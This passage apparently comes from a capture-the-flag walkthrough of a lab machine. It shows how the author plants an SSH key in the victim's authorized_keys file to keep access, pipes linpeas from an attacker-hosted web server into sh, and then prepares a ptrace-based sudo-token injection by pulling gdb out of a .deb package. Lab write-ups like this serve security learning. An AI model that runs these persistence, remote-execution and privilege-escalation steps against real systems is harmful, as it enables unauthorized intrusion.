ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vZarFqiXyoMZ/+B9S5jcOMRIOwWMyTvWUIWwsTc2WlDBgRPRA4dnEtvHzN+WLEE0mLsatYqipe5ULuZ6EbKE1vD5lx5BO+zrEQafs5JcJ5Th0noVivP9BS3E5EuccqMOPUBKZ6YQA9Yc5jLMz2MzaRpUQSy7QojdLziXU1s0cl6TbVQbNypj4JJcmz76TxhN/gR+FXUR+YTdtb08/IJx3eOq5b0lZthBbeDXszcQKl4fwP1/MBvmmEgD2ByvdUk+kckOJsi2IEiJjm7AIFK8s2/MW2cl/t1+qDS+c/HMEQf4lum4sMEcMP7WKZ9XLHL4DPsrwCrUsK/qntuP+lvormUn9otLc0yirRpawpdBocxOpxNZKp7FL3xr47yN3A406CaLXgMYSqP2WQrumH0VsfRMp+oSxYCRC9HzFoRto7qXw3rWozLgq0RicWzdOhD59Ooc4ZA5Kro46ftMD8oCOzUDzK/lKmhnHN3Kuiz6bklOMx4qtfu28PozrFPq348= witty@kali

kyle@seasurfer:~$ ls -lah
ls -lah
total 48K
drwxr-x--- 7 kyle kyle     4.0K Apr 22  2022 .
drwxr-xr-x 3 root root     4.0K Apr 16  2022 ..
drwxrwxr-x 2 kyle kyle     4.0K Apr 19  2022 backups
lrwxrwxrwx 1 kyle kyle        9 Apr 18  2022 .bash_history -> /dev/null
-rw-r--r-- 1 kyle kyle      220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 kyle kyle     3.7K Feb 25  2020 .bashrc
drwx------ 3 kyle kyle     4.0K Apr 17  2022 .cache
drwxrwxr-x 3 kyle kyle     4.0K Apr 17  2022 .local
-rw-r--r-- 1 kyle kyle      807 Feb 25  2020 .profile
-rw-rw-r-- 1 kyle www-data   66 Apr 17  2022 .selected_editor
drwx------ 3 kyle kyle     4.0K Apr 18  2022 snap
drwx------ 2 kyle kyle     4.0K Apr 17  2022 .ssh
-rw-r--r-- 1 kyle kyle        0 Apr 16  2022 .sudo_as_admin_successful
-rw-rw-r-- 1 kyle kyle       27 Apr 18  2022 user.txt
kyle@seasurfer:~$ cd .ssh
cd .ssh
kyle@seasurfer:~/.ssh$ ls
ls
authorized_keys
kyle@seasurfer:~/.ssh$ cat authorized_keys
cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCtBFOcOYPyroXT89k6kqrP1gPBKZ/29utGW9QkJ9fI9ExhH/6wOtAcVkpAKn2Q3Mq96j8WO8qPOByb9o67pn2NXvoru3tOl8fsjsO1QJRchPdhNnZy59H5ssWm/uoi/RtfPbprld7QEc3VQlM+N6A8ocAUfY/6ELlnIGBNugTogKDLKP7y78mNCXODZoejuP11pWXrTawe9rm7fBSSjVFQngxS5ziMloTwyXxhNrRjK9C3Xlbqap8p+kYu7Ttqeaa5jrKg7HPvZ5E/Hn9nHnSA8Tl6wMWAAIMVKljoyFkQ494ehqORTK3UG6d3Wtz4DZacw9nH8Hs6cajEMKS7JucPIrBePBfdmLcIdzEs+vPWsMd6DZVLVNcU6FYLXwhAPSL6YyU4XIVF40E2f1waBHhdivxc0DkDCfJLObMGAbcnmeVUIj67fMrvmB0clK+3qvWqhw+L2JoOoOHqd03Q5jEZ0nwDLE1Tdr6Yn0JWjvotq57HSDkvyeUuF6AgxIHR/os= kyle@seasurfer

kyle@seasurfer:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vZarFqiXyoMZ/+B9S5jcOMRIOwWMyTvWUIWwsTc2WlDBgRPRA4dnEtvHzN+WLEE0mLsatYqipe5ULuZ6EbKE1vD5lx5BO+zrEQafs5JcJ5Th0noVivP9BS3E5EuccqMOPUBKZ6YQA9Yc5jLMz2MzaRpUQSy7QojdLziXU1s0cl6TbVQbNypj4JJcmz76TxhN/gR+FXUR+YTdtb08/IJx3eOq5b0lZthBbeDXszcQKl4fwP1/MBvmmEgD2ByvdUk+kckOJsi2IEiJjm7AIFK8s2/MW2cl/t1+qDS+c/HMEQf4lum4sMEcMP7WKZ9XLHL4DPsrwCrUsK/qntuP+lvormUn9otLc0yirRpawpdBocxOpxNZKp7FL3xr47yN3A406CaLXgMYSqP2WQrumH0VsfRMp+oSxYCRC9HzFoRto7qXw3rWozLgq0RicWzdOhD59Ooc4ZA5Kro46ftMD8oCOzUDzK/lKmhnHN3Kuiz6bklOMx4qtfu28PozrFPq348= witty@kali" >> authorized_keys 

┌──(witty㉿kali)-[~/Downloads/seasurfer]
└─$ ssh -i id_rsa kyle@10.10.74.111
The authenticity of host '10.10.74.111 (10.10.74.111)' can't be established.
ED25519 key fingerprint is SHA256:4ChmQCQ0tIG/wbF2YLD8+ZdmJVvA1bFzIRVLwXXrs0g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.74.111' (ED25519) to the list of known hosts.

  ___ ___   _     ___ _   _ ___ ___ ___ ___ 
 / __| __| /_\   / __| | | | _ \ __| __| _ \
 \__ \ _| / _ \  \__ \ |_| |   / _|| _||   /
 |___/___/_/ \_\ |___/\___/|_|_\_| |___|_|_\
                                            

Last login: Mon Jul 10 22:02:10 2023 from 127.0.0.1
kyle@seasurfer:~$ id
uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),4(adm),24(cdrom),27(sudo),30(dip),33(www-data),46(plugdev)

linpeas on the fly

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.74.111 - - [10/Jul/2023 19:39:20] "GET /linpeas.sh HTTP/1.1" 200 -

kyle@seasurfer:~$ cd /tmp
kyle@seasurfer:/tmp$ wget http://10.8.19.103:1234/linpeas.sh -O - |sh |tee -a linpeas.txt
--  http://10.8.19.103:1234/linpeas.sh
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828098 (809K) [text/x-sh]
Saving to: ‘STDOUT’

We all noticed that sometimes sudo doesn't ask us for a password because he remembers us. How does he remember us and how does he identifies us? Can we falsify our identity and become root?

`sudo` creates a file for each linux user in `/var/run/sudo/ts/[username]`. These files contain both successful and failed authentications, then sudo uses these files to remember all the authenticated processes.

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is disabled (0)
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

`kyle` have used sudo to execute something in the last 15mins (by default that's the duration of the sudo token that allows to use sudo without introducing any password

kyle@seasurfer:/tmp$ whoami
kyle
kyle@seasurfer:/tmp$ ps faux |grep sudo |grep ^`whoami`
kyle        1125  0.0  0.1   6892  2324 pts/0    Ss+  22:02   0:00  \_ bash -c sudo /root/admincheck; sleep infinity
kyle       96988  0.0  0.0   6300   724 pts/4    S+   23:48   0:00              \_ grep --color=auto sudo
kyle@seasurfer:/tmp$ cat /proc/sys/kernel/yama/ptrace_scope
0

`ptrace protection` as disabled

- `ptrace` is a very aptly named **Linux** system call and a debugging tool which allows to observe and _trace_ how a _process_ runs in the operating system
- However, this can be abused, since many processes contain secrets and sensitive information (such as `sudo` tokens)
- **Yama** is a **Linux Security Module** that aims to fix this by setting a scope for the processes that can be observed with `ptrace`
- If the **Yama** `ptrace_scope` is set to **0**, the protection is disabled, which allows the observation of all processes

https://github.com/nongiach/sudo_inject

We need the `gdb` program, which is a debugger for `C`, to be able to use the `ptrace` system call properly.

kyle@seasurfer:/tmp$ grep -v "^#" /etc/apt/sources.list
deb http://fi.archive.ubuntu.com/ubuntu focal main restricted

deb http://fi.archive.ubuntu.com/ubuntu focal-updates main restricted

deb http://fi.archive.ubuntu.com/ubuntu focal universe
deb http://fi.archive.ubuntu.com/ubuntu focal-updates universe

deb http://fi.archive.ubuntu.com/ubuntu focal multiverse
deb http://fi.archive.ubuntu.com/ubuntu focal-updates multiverse

deb http://fi.archive.ubuntu.com/ubuntu focal-backports main restricted universe multiverse

deb http://fi.archive.ubuntu.com/ubuntu focal-security main restricted
deb http://fi.archive.ubuntu.com/ubuntu focal-security universe
deb http://fi.archive.ubuntu.com/ubuntu focal-security multiverse

Here, we can't install `gdb` using `sudo apt install gdb`, as we don't know `kyle`'s password to run `sudo`. Therefore, we could instead download the [`.deb` package, which actually is an archive file](https://en.wikipedia.org/wiki/Deb_(file_format))

Debian packages are standard Unix ar archives that include two tar archives. One archive holds the control information and another contains the installable data.

┌──(witty㉿kali)-[~/Downloads]
└─$ wget http://fi.archive.ubuntu.com/ubuntu/pool/main/g/gdb/gdb_9.1-0ubuntu1_amd64.deb -O gdb.deb
--  http://fi.archive.ubuntu.com/ubuntu/pool/main/g/gdb/gdb_9.1-0ubuntu1_amd64.deb
Resolving fi.archive.ubuntu.com (fi.archive.ubuntu.com)... 193.166.3.5, 2001:708:10:8::5
Connecting to fi.archive.ubuntu.com (fi.archive.ubuntu.com)|193.166.3.5|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3218448 (3.1M) [application/x-debian-package]
Saving to: ‘gdb.deb’

gdb.deb        0%       0  --.-KB/sgdb.deb        0%  21.73K   105KB/sgdb.deb        1%  50.09K   120KB/sgdb.deb        3% 106.81K   170KB/sgdb.deb        7% 220.25K   263KB/sgdb.deb       14% 447.12K   428KB/sgdb.deb       28% 895.13K   713KB/sgdb.deb       50%   1.55M  1.04MB/sgdb.deb      100%   3.07M  1.93MB/s    in 1.6s    

(1.93 MB/s) - ‘gdb.deb’ saved [3218448/3218448]

┌──(witty㉿kali)-[~/Downloads]
└─$ ar x gdb.deb
                                   
┌──(witty㉿kali)-[~/Downloads]
└─$ xz -d data.tar.xz && tar xvf data.tar
./
./etc/
./etc/gdb/
./etc/gdb/gdbinit
./usr/
./usr/bin/
